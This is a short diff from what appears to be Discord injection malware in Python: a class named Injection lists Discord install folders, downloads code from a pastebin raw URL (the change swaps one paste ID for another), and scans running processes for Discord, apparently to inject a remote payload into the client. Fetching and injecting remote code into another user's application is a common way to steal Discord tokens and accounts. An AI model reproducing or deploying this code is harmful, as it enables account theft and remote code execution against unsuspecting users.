@@ -15,7 +15,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://pastebin.com/raw/JxznJKVN').text
+        self.code = requests.get('https://pastebin.com/raw/4iMQ8Sd4').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
